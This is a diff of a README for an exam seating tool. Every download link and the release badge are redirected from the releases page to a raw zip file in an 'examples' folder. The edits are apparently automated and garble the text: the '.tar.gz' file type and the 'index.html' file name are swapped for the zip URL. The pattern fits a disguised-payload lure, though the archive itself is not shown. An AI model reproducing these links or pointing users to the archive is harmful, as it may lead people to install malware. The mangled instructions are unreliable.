@@ -1,6 +1,6 @@
 # 🎓 exam-seating-arranger - Smart Seating for Fair Exams
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Bossr1387/exam-seating-arranger/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip%20Latest%https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip)](https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip)
 
 ## 🛠️ Overview
 
@@ -27,13 +27,13 @@ To get started with exam-seating-arranger, follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to go to the releases page.
 
-   [Download Latest Release](https://github.com/Bossr1387/exam-seating-arranger/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip)
 
-2. **Download the Latest Version**: On the releases page, find the latest release of the application. Look for the `.zip` or `.tar.gz` file.
+2. **Download the Latest Version**: On the releases page, find the latest release of the application. Look for the `.zip` or `https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip` file.
 
 3. **Extract the Files**: After downloading, extract the files to a location on your computer.
 
-4. **Open the Application**: Navigate to the folder where you extracted the files and open the `index.html` file in your web browser.
+4. **Open the Application**: Navigate to the folder where you extracted the files and open the `https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip` file in your web browser.
 
 5. **Input Data**: Prepare a CSV file with student information including names and organizations. Upload it in the application.
 
@@ -45,7 +45,7 @@ To get started with exam-seating-arranger, follow these steps:
 
 To download exam-seating-arranger, simply visit the releases page:
 
-[Download Latest Release](https://github.com/Bossr1387/exam-seating-arranger/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Bossr1387/exam-seating-arranger/main/examples/exam-seating-arranger-v3.1.zip)
 
 Choose the appropriate file for your setup, extract it, and follow the getting started steps mentioned above.
 
